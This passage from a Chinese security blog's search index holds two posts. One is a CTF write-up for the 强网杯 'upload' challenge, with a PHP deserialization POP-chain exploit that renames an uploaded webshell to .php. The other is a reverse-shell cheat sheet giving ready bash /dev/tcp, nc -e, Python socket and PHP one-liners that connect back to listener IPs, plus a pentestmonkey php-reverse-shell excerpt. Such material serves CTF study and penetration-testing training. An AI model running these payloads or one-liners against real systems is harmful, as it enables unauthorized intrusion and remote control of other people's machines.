class="string">'ID'</span>])-&gt;data([<span class="string">"img"</span>=&gt;addslashes(<span class="keyword">$this</span>-&gt;img)])-&gt;update())&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;update_cookie();</span><br><span class="line">                <span class="keyword">$this</span>-&gt;success(<span class="string">'Upload img successful!'</span>, url(<span class="string">'../home'</span>));</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">'Upload file failed!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_cookie</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker-&gt;profile[<span class="string">'img'</span>]=<span class="keyword">$this</span>-&gt;img;</span><br><span class="line">        cookie(<span class="string">"user"</span>,base64_encode(serialize(<span class="keyword">$this</span>-&gt;checker-&gt;profile)),<span class="number">3600</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ext_check</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $ext_arr=explode(<span class="string">"."</span>,<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ext=end($ext_arr);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext==<span class="string">"png"</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>Index.php</code>中,<code>login_check</code>函数,读取<code>cookie</code>并进行了反序列化,而且并没有先对<code>cookie</code>进行检查,可能存在反序列化漏洞</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login_check</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $profile=cookie(<span class="string">'user'</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($profile))&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;profile=unserialize(base64_decode($profile));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;profile_db=db(<span class="string">'user'</span>)-&gt;where(<span class="string">"ID"</span>,intval(<span class="keyword">$this</span>-&gt;profile[<span class="string">'ID'</span>]))-&gt;find();</span><br><span class="line">        <span class="keyword">if</span>(array_diff(<span class="keyword">$this</span>-&gt;profile_db,<span class="keyword">$this</span>-&gt;profile)==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>我们已经上传了<code>shell</code>,但由于扩展名问题不能直接解析,所以先找找看源码里是否有修改文件名的方法</p>
<p>在<code>Profile.php</code>中,<code>upload_img</code>函数中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">         <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">             $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span><br><span class="line">             <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">             <span class="keyword">exit</span>();</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">         <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]).<span class="string">".png"</span>;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">     <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">         <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">             @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">             @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">             <span class="keyword">$this</span>-&gt;img=<span class="string">"../upload/$this-&gt;upload_menu/$this-&gt;filename"</span>;</span><br><span class="line">             <span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">         &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             <span class="keyword">$this</span>-&gt;error(<span class="string">'Forbidden type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;error(<span class="string">'Unknow file type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>
<p>注:</p>
<pre><code>copy(source,destination)
说明:将文件从 source 拷贝到 destination。如果成功则返回 TRUE，否则返回 FALSE。
</code></pre><p>首先对判断了文件<code>filename_tmp</code>是否存在,然后使用 copy,拷贝文件并重命名为<code>filename</code>,但需要将<code>$this-&gt;checker</code>赋值为<code>0</code>或者<code>false</code>和<code>ext</code>赋值为<code>1</code>或<code>true</code>,不然不能向下执行到文件重命名。<br>如果能通过反序列化控制变量并执行上面的代码,就能够修改上传的<code>shell</code>的扩展名,反序列化通常会触发一些<code>魔术方法</code>,于是看看源码里有哪些<code>魔术方法</code></p>
<p>在<code>Index.php</code>中存在</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>固定返回空字符串,好像没什么利用价值</p>
<p>在<code>Register.php</code>中存在 <code>__construct</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;checker=<span class="keyword">new</span> Index();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>__construct</code>当对象创建（new）时会自动调用。但在<code>unserialize()</code> 时是不会自动调用的。<br><code>__destruct</code>当对象被销毁时会自动调用.</p>
<p>在<code>Profile.php</code>中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>访问不存在的成员变量时调用<code>__get()</code><br>当调用类中不存在的方法时，就会调用<code>__call()</code></p>
<p>若<code>Profile</code>对象调用了不存在的方法<code>$name</code>,触发<code>__call()</code>,同时,若<code>Profile</code>对象中不存在<code>$name</code>变量,触发<code>__get()</code>方法,调用<code>$this-&gt;except[$name]</code>。</p>
<p>上面说到,<code>Profile.php</code>中,<code>upload_img</code>函数可以修改文件名<br><code>Register</code>对象销毁且<code>registed</code>值为<code>false</code>时会调用<code>$this-&gt;checker-&gt;index()</code>,<br>若我们构造一个<code>Register</code>对象,将<code>checker</code>覆盖为<code>Profile</code>对象,由与<code>Profile</code>中没有<code>index()</code>函数,触发<code>__call(&#39;index&#39;,&quot;&quot;)</code>,又由于<code>Profile</code>中没有<code>index</code>变量,触发<code>__get()</code>方法去调用<code>except[&#39;index&#39;]</code>,如果同时将该<code>Profile</code>对象<code>except</code>赋值为如下数组</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$except=<span class="keyword">array</span>(<span class="string">'index'</span>=&gt;<span class="string">'upload_img'</span>);</span><br></pre></td></tr></table></figure>
<p>将<code>filename_tmp</code>赋值为当前<code>shell</code>的文件名<br>将<code>filename</code>赋值为扩展名为<code>php</code>的<code>shell</code>的文件名<br>不要忘了<code>$checker=0</code>和<code>$ext=1</code>,就能调用<code>upload_img()</code>函数修改上传的<code>shell</code>的扩展名。</p>
<h2 id="Part-3-利用漏洞-getshell"><a href="#Part-3-利用漏洞-getshell" class="headerlink" title="Part 3 利用漏洞 getshell"></a>Part 3 利用漏洞 getshell</h2><p>完整构造过程</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp=<span class="string">"../public/upload/916147a757e9009808495904bbd7119a/3d694425bf5c9803db0c7b3d776cd2f1.png"</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">"../public/upload/916147a757e9009808495904bbd7119a/shell.php"</span>;</span><br><span class="line">    <span class="keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="keyword">public</span> $ext=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> $img;</span><br><span class="line">    <span class="keyword">public</span> $except=<span class="keyword">array</span>(<span class="string">'index'</span>=&gt;<span class="string">'upload_img'</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ex=<span class="keyword">new</span> Register();</span><br><span class="line">$ex-&gt;checker=<span class="keyword">new</span> Profile();</span><br><span class="line">$ex-&gt;checker-&gt;checker = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($ex));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>替换掉<code>cookie</code>,返回主页,报错了</p>
<p><img src="/2019/11/29/qwb-upload/err.png" alt="err"></p>
<p>当执行<code>login_check</code>时,反序列化<code>cookie</code>,最终修改上传<code>shell</code>的后缀为<code>php</code></p>
<p><img src="/2019/11/29/qwb-upload/dir.png" alt="dir"></p>
<p>再用<code>蚁剑</code>连接即可<code>getshell</code></p>
<p><img src="/2019/11/29/qwb-upload/as1.png" alt="as1"></p>
<p><img src="/2019/11/29/qwb-upload/as2.png" alt="as2"></p>
<h2 id="part-4-攻击流程"><a href="#part-4-攻击流程" class="headerlink" title="part 4 攻击流程"></a>part 4 攻击流程</h2><p><code>Index.php</code>中<code>unserialize()</code>反序列化伪造的<code>cookie</code><br>=&gt;<code>Register.php</code>中<code>__destruct()</code>尝试执行<code>Profile</code>对象的<code>index()</code><br>=&gt;触发<code>Profile.php</code>中<code>__call(&#39;index&#39;,&quot;&quot;)</code><br>=&gt;触发<code>Profile.php</code>中<code>__get</code>执行<code>except[&#39;index&#39;]</code><br>=&gt;调用<code>except[&#39;index&#39;]</code>即<code>upload_img</code>修改文件名</p>
]]></content>
      <categories>
        <category>CTF-WEB</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>强网杯</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>反弹shell姿势总结</title>
    <url>/2019/11/27/reverseShell/</url>
    <content><![CDATA[<h1 id="反弹-shell-姿势总结"><a href="#反弹-shell-姿势总结" class="headerlink" title="反弹 shell 姿势总结"></a>反弹 shell 姿势总结</h1><h2 id="在Kali上开启监听"><a href="#在Kali上开启监听" class="headerlink" title="在Kali上开启监听"></a>在<code>Kali</code>上开启监听</h2><h3 id="使用-nc"><a href="#使用-nc" class="headerlink" title="使用 nc"></a>使用 <code>nc</code></h3><pre><code><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nc -lvp <span class="number">4444</span></span><br></pre></td></tr></table></figure>
</code></pre><p><img src="/2019/11/27/reverseShell/nc.png" alt="ncshell"></p>
<h3 id="使用msf"><a href="#使用msf" class="headerlink" title="使用msf"></a>使用<code>msf</code></h3><p>注意系统不同所使用的<code>payload</code>也不同,可根据<code>uname -a</code>查看系统内核信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploits/multi/handler</span><br><span class="line">set payload linux/x64/shell/reverse_tcp</span><br><span class="line">set lhost yourhost</span><br><span class="line">set lport yourport</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<p><img src="/2019/11/27/reverseShell/msf2.png" alt="msf1"></p>
<h2 id="发送shell"><a href="#发送shell" class="headerlink" title="发送shell"></a>发送<code>shell</code></h2><h3 id="Linux-反弹-shell"><a href="#Linux-反弹-shell" class="headerlink" title="Linux 反弹 shell"></a>Linux 反弹 shell</h3><pre><code><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip<span class="built_in">/port </span>0&gt;&amp;1</span><br></pre></td></tr></table></figure>
</code></pre><h3 id="使用nc"><a href="#使用nc" class="headerlink" title="使用nc"></a>使用<code>nc</code></h3><pre><code>nc 192.168.140.128 4444 -e /bin/sh
</code></pre><p><img src="/2019/11/27/reverseShell/nc2.png" alt="nc2"><br><img src="/2019/11/27/reverseShell/nc3.png" alt="nc3"><br>若不支持<code>-e</code>参数<br>则分别在发送端(192.168.140.129:prot2)和接收端(192.168.140.128:port1)开启监听<br><code>nc 192.168.140.128 port1|/bin/bash|192.168.140.129 port2</code></p>
<h3 id="使用python"><a href="#使用python" class="headerlink" title="使用python"></a>使用<code>python</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.140.128",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></table></figure>
<p><img src="/2019/11/27/reverseShell/py.png" alt="py"><br><img src="/2019/11/27/reverseShell/py2.png" alt="py2"></p>
<h3 id="使用-php"><a href="#使用-php" class="headerlink" title="使用 php"></a>使用 php</h3><pre><code><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php- <span class="string">'exec("/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.4/7777")'</span></span><br></pre></td></tr></table></figure>
</code></pre><p>可上传或拥有一定读写权限时可使用<code>https://github.com/pentestmonkey/php-reverse-shell</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">set_time_limit (<span class="number">0</span>);</span><br><span class="line">$VERSION = <span class="string">"1.0"</span>;</span><br><span class="line">$ip = <span class="string">'127.0.0.1'</span>;  <span class="comment">// CHANGE THIS</span></span><br><span class="line">$port = <span class="number">1234</span>;       <span class="comment">// CHANGE THIS</span></span><br><span class="line">$chunk_size = <span class="number">1400</span>;</span><br><span class="line">$write_a = <span class="keyword">null</span>;</span><br><span class="line">$error_a = <span class="keyword">null</span>;</span><br><span class="line">$shell = <span class="string">'uname -a; w; id; /bin/sh -i'</span>;</span><br><span class="line">$daemon = <span class="number">0</span>;</span><br><span class="line">$debug = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>修改上面的 ip 和端口,访问该页面就会反弹回来一个 shell</p>
]]></content>
      <categories>
        <category>web安全学习</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
</search>
